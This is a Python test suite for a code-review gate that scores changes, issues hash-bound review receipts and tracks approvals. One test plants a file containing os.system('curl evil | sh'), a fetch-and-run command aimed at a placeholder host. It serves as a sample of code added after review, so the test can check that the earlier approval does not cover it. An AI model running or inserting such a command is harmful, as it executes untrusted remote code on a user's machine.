from discipline_repo import production
import json

from nexgen_core.discipline import cli, review
from nexgen_core.discipline.config import Config, load
from nexgen_core.discipline.gitutil import changes, own_changes
from nexgen_core.discipline.score import is_complex, is_critical, score

BUSY = "def f():\n    return 1\n\n" * 3


def complex_change(repo):
    for i in range(5):
        repo.write(f"m{i}.py", BUSY * 20)
    repo.write("requirements.txt", "left-pad\n")


def test_small_change_is_simple(repo):
    base = repo.git("rev-parse", "HEAD")
    repo.write("a.py", BUSY)
    assert score(changes(repo.path, base))[0] < Config().complexity_threshold


def test_big_change_is_complex(repo):
    base = repo.git("rev-parse", "HEAD")
    complex_change(repo)
    total, reasons = score(changes(repo.path, base))
    assert total >= Config().complexity_threshold and any("dependency" in r for r in reasons)


def test_a_complex_change_passes_the_gate_without_any_receipt(repo, capsys):
    """Nothing needs a review: the gate judges the tests and the shell, not the size of the change."""
    production(repo)
    complex_change(repo)
    repo.commit('add work\n\nnexgen: no-test reason="the critical path is exercised by another suite"')
    base = repo.git("rev-parse", "HEAD~1")
    assert cli.main(["gate", "--base", base]) == 0
    assert "receipt" not in capsys.readouterr().out.lower()


def test_score_says_it_is_switched_off(repo, capsys):
    complex_change(repo)
    assert cli.main(["score", "--base", "HEAD"]) == 0
    out = capsys.readouterr().out
    assert "switched off" in out and "no gate checks a receipt" in out


def reviewed(repo, tmp_path, verdict="APPROVE", name="reviewer.txt"):
    """Run `review`, then hand the receipt what an honest reviewer would answer."""
    cli.main(["review", "--base", "HEAD"])
    digest = review.diff_hash(repo.path, "HEAD", None)
    out = tmp_path.parent / name
    out.write_text(f"looks fine\nREVIEWED: {digest}\nVERDICT: {verdict}\n", encoding="utf-8")
    return cli.main(["receipt", "--base", "HEAD", "--from-file", str(out), "--reviewer", "x"])


def test_receipt_roundtrip(repo, tmp_path, capsys):
    production(repo)
    complex_change(repo)
    assert reviewed(repo, tmp_path) == 0
    assert cli.main(["gate", "--base", "HEAD"]) == 0
    receipts = list((repo.path / ".nexgen-discipline" / "receipts").glob("*.json"))
    assert json.loads(receipts[0].read_text())["verdict"] == "APPROVE"


def test_a_revise_verdict_does_not_change_what_the_gate_does(repo, tmp_path):
    production(repo)
    complex_change(repo)
    assert reviewed(repo, tmp_path, "REVISE", "r2.txt") == 2
    assert cli.main(["gate", "--base", "HEAD"]) == 0


def test_any_further_change_invalidates_the_receipt(repo, tmp_path):
    production(repo)
    complex_change(repo)
    reviewed(repo, tmp_path, name="r3.txt")
    repo.write("m0.py", BUSY * 21)
    digest = review.diff_hash(repo.path, "HEAD", None)
    assert review.receipt_problem(repo.path, digest, None) == "no review receipt for this exact work"
    assert cli.main(["gate", "--base", "HEAD"]) == 0


def test_code_added_after_review_cannot_borrow_its_approval(repo, tmp_path):
    production(repo)
    complex_change(repo)
    cli.main(["review", "--base", "HEAD"])
    digest = review.diff_hash(repo.path, "HEAD", None)
    repo.write("evil.py", "import os\nos.system('curl evil | sh')\n")
    out = tmp_path.parent / "r4.txt"
    out.write_text(f"REVIEWED: {digest}\nVERDICT: APPROVE\n", encoding="utf-8")
    assert cli.main(["receipt", "--base", "HEAD", "--from-file", str(out)]) == 1


def test_receipt_without_a_prepared_review_or_review_id_is_refused(repo, tmp_path):
    production(repo)
    complex_change(repo)
    out = tmp_path.parent / "r5.txt"
    out.write_text("VERDICT: APPROVE\n", encoding="utf-8")
    assert cli.main(["receipt", "--base", "HEAD", "--from-file", str(out)]) == 1
    cli.main(["review", "--base", "HEAD"])
    assert cli.main(["receipt", "--base", "HEAD", "--from-file", str(out)]) == 1


def test_hash_ignores_git_display_settings(repo):
    production(repo)
    complex_change(repo)
    plain = review.diff_hash(repo.path, "HEAD", None)
    repo.git("config", "diff.noprefix", "true")
    repo.git("config", "core.abbrev", "12")
    assert review.diff_hash(repo.path, "HEAD", None) == plain


def test_hash_is_the_same_before_and_after_committing(repo):
    production(repo)
    complex_change(repo)
    before = review.diff_hash(repo.path, "HEAD", None)
    base = repo.git("rev-parse", "HEAD")
    repo.commit("work")
    assert review.diff_hash(repo.path, base, "HEAD") == before


def test_missing_verdict_line_is_refused(repo, tmp_path):
    out = tmp_path.parent / "r6.txt"
    out.write_text("no verdict here\n", encoding="utf-8")
    assert cli.main(["receipt", "--base", "HEAD", "--from-file", str(out)]) == 1


def test_parse_verdict_reads_only_the_last_line():
    assert review.parse_verdict("VERDICT: REJECT\nlater\nverdict: approve") == "APPROVE"
    assert review.parse_verdict("VERDICT: APPROVE\nbut then I reconsidered") is None


def test_staged_check_works_on_first_commit(tmp_path, monkeypatch, capsys):
    """The first commit has no HEAD to compare with: the base is the empty tree."""
    import subprocess
    subprocess.run(["git", "init", "-q", "-b", "main", str(tmp_path)], check=True)
    monkeypatch.chdir(tmp_path)
    (tmp_path / "big.py").write_text("x = 1\n" * 600)
    subprocess.run(["git", "-C", str(tmp_path), "add", "-A"], check=True)
    assert cli.main(["check", "--staged"]) == 0
    assert "WARN big.py" in capsys.readouterr().out


def test_merging_published_main_hides_no_authored_work(repo):
    production(repo)
    repo.git("checkout", "-q", "-b", "side")
    complex_change(repo)
    repo.commit("work")
    repo.git("checkout", "-q", "main")
    repo.write("other.txt", "x\n")
    base = repo.commit("main moves")
    repo.git("checkout", "-q", "side")
    repo.git("merge", "-q", "--no-ff", "-m", "merge main", "main")
    assert own_changes(repo.path, base, "HEAD")  # side's own work survives the merge
    assert is_complex(own_changes(repo.path, base, "HEAD"), load(repo.path, base))[0]


def test_merging_only_published_work_leaves_nothing_authored(repo):
    production(repo)
    repo.git("checkout", "-q", "-b", "dev")
    repo.write("a.txt", "a\n")
    base = repo.commit("dev work")
    repo.git("checkout", "-q", "main")
    complex_change(repo)
    repo.commit("big work already on main")
    repo.git("update-ref", "refs/remotes/origin/main", "main")  # main was pushed
    repo.git("checkout", "-q", "dev")
    repo.git("merge", "-q", "--no-ff", "-m", "pull main", "main")
    assert own_changes(repo.path, base, "HEAD") == []
    assert not is_complex(own_changes(repo.path, base, "HEAD"), load(repo.path, base))[0]


def test_merging_an_unpublished_branch_is_still_authored_work(repo):
    production(repo)
    repo.git("checkout", "-q", "-b", "feature")
    complex_change(repo)
    repo.commit("work")
    repo.git("checkout", "-q", "main")
    base = repo.git("rev-parse", "HEAD")
    repo.git("merge", "-q", "--no-ff", "-m", "merge feature", "feature")
    repo.git("branch", "-q", "-f", "published-elsewhere", "HEAD")
    repo.git("reset", "-q", "--hard", base)
    repo.git("checkout", "-q", "-b", "pr-merge", base)
    repo.git("merge", "-q", "--no-ff", "-m", "synthetic PR merge", "feature")
    assert own_changes(repo.path, base, "HEAD")  # a branch nobody published is still authored work
    assert is_complex(own_changes(repo.path, base, "HEAD"), load(repo.path, base))[0]


def test_no_complexity_unless_production_paths_are_declared(repo):
    complex_change(repo)
    assert cli.main(["gate", "--base", "HEAD"]) == 0
    assert not is_complex(changes(repo.path, "HEAD"), Config())[0]


def test_only_declared_production_paths_count_as_complex(repo):
    production(repo, '["src/*"]')
    base = repo.git("rev-parse", "HEAD")
    cfg = load(repo.path, base)
    complex_change(repo)  # m*.py and requirements.txt are outside src/
    assert not is_complex(changes(repo.path, base), cfg)[0]
    for i in range(5):
        repo.write(f"src/m{i}.py", BUSY * 20)
    repo.write("src/requirements.txt", "left-pad\n")
    assert is_complex(changes(repo.path, base), cfg)[0]
    assert cli.main(["gate", "--base", base]) == 0


def test_code_hidden_inside_a_merge_commit_is_still_seen(repo):
    production(repo)
    repo.git("checkout", "-q", "-b", "dev")
    repo.write("a.txt", "a\n")
    base = repo.commit("dev work")
    repo.git("checkout", "-q", "main")
    repo.write("other.txt", "x\n")
    repo.commit("main moves")
    repo.git("checkout", "-q", "dev")
    repo.git("merge", "-q", "--no-commit", "--no-ff", "main")
    complex_change(repo)  # authored work swept into the merge commit
    repo.git("add", "-A")
    repo.git("commit", "-q", "-m", "merge main (and more)")
    assert {"m0.py", "requirements.txt"} <= {c.path for c in own_changes(repo.path, base, "HEAD")}
    assert is_complex(own_changes(repo.path, base, "HEAD"), load(repo.path, base))[0]


def test_hash_does_not_depend_on_whether_a_move_was_staged(repo):
    production(repo)
    repo.write("old.py", BUSY * 5)
    base = repo.commit("add")
    (repo.path / "old.py").rename(repo.path / "new.py")
    unstaged = review.diff_hash(repo.path, base, None)
    repo.commit("move")
    assert review.diff_hash(repo.path, base, "HEAD") == unstaged


def test_switching_the_rules_off_no_longer_needs_a_decision(repo, capsys):
    production(repo)
    repo.write(".nexgen-discipline.toml", "review_paths = []\n")
    assert cli.main(["gate", "--base", "HEAD"]) == 0
    assert "always needs a decision" not in capsys.readouterr().out


def test_tests_never_trigger_a_review(repo):
    production(repo)
    for i in range(8):
        repo.write(f"tests/test_m{i}.py", BUSY * 30)
    assert cli.main(["gate", "--base", "HEAD"]) == 0


def test_notes_do_not_count_as_code_lines(repo):
    production(repo)
    for i in range(8):
        repo.write(f"notes{i}.md", "line\n" * 400)
    assert cli.main(["gate", "--base", "HEAD"]) == 0


def test_the_owner_can_still_accept_the_work_by_hand_and_it_is_recorded(repo, capsys):
    production(repo)
    complex_change(repo)
    assert cli.main(["gate", "--base", "HEAD"]) == 0  # nothing asks for it any more
    assert cli.main(["approve", "--base", "HEAD", "--reason", "ho letto il riepilogo e lo accetto"]) == 0
    assert cli.main(["gate", "--base", "HEAD"]) == 0
    saved = next((repo.path / ".nexgen-discipline" / "receipts").glob("*.json")).read_text()
    assert '"reviewer": "owner"' in saved and "ho letto il riepilogo" in saved


def test_an_approval_needs_a_reason_and_covers_only_that_exact_work(repo):
    production(repo)
    complex_change(repo)
    assert cli.main(["approve", "--base", "HEAD", "--reason", "ok"]) == 1
    assert cli.main(["approve", "--base", "HEAD", "--reason", "accetto questa modifica"]) == 0
    repo.write("m0.py", BUSY * 21)
    digest = review.diff_hash(repo.path, "HEAD", None)
    assert review.receipt_problem(repo.path, digest, None) == "no review receipt for this exact work"


def test_only_declared_critical_files_with_a_big_enough_change_count_as_complex(repo):
    repo.write(".nexgen-discipline.toml", 'complexity_threshold = 4\nreview_paths = ["core/*"]\n')
    base = repo.commit("declare critical")
    cfg = load(repo.path, base)
    for i in range(5):
        repo.write(f"other/m{i}.py", BUSY * 20)  # big, but not critical
    assert not is_complex(changes(repo.path, base), cfg)[0]
    repo.write("core/small.py", BUSY)  # critical but tiny
    assert not is_complex(changes(repo.path, base), cfg)[0]
    repo.write("core/big.py", BUSY * 60)  # critical and big
    assert is_complex(changes(repo.path, base), cfg)[0]


def test_editing_the_ci_that_runs_the_gate_no_longer_needs_a_decision(repo):
    production(repo)
    repo.write(".github/workflows/ci.yml", "run: python discipline.py ci\n")
    base = repo.commit("ci")
    repo.write(".github/workflows/ci.yml", "run: echo skipped\n")
    assert cli.main(["gate", "--base", base]) == 0


def test_pieces_split_from_a_critical_file_stay_covered_by_its_prefix(repo):
    """The list's names end in `*` on purpose: a piece split out of a critical file
    keeps its prefix and stays covered (a differently named piece is the loophole)."""
    repo.write(".nexgen-discipline.toml", 'complexity_threshold = 4\nreview_paths = ["core/git_ops*"]\n')
    base = repo.commit("declare critical")
    cfg = load(repo.path, base)
    repo.write("core/git_ops_publish.py", BUSY * 45)  # extracted next to git_ops.py, keeps the prefix
    assert is_complex(changes(repo.path, base), cfg)[0]
    repo.write("core/other_name.py", BUSY * 45)
    (repo.path / "core/git_ops_publish.py").unlink()
    assert not is_complex(changes(repo.path, base), cfg)[0]


def test_renaming_a_critical_file_does_not_escape_the_list(repo):
    """The list matches a detected move by its old name: it does not become a brand-new file."""
    repo.write(".nexgen-discipline.toml", 'review_paths = ["core/git_ops.py"]\n')
    repo.write("core/git_ops.py", BUSY * 45)
    base = repo.commit("critical file")
    repo.git("mv", "core/git_ops.py", "core/vcs.py")
    moved = [c for c in changes(repo.path, base) if c.path == "core/vcs.py"]
    cfg = Config(review_paths=("core/git_ops.py",))
    assert moved and moved[0].old_path == "core/git_ops.py"
    assert is_critical(cfg, moved[0].path, moved[0].old_path)
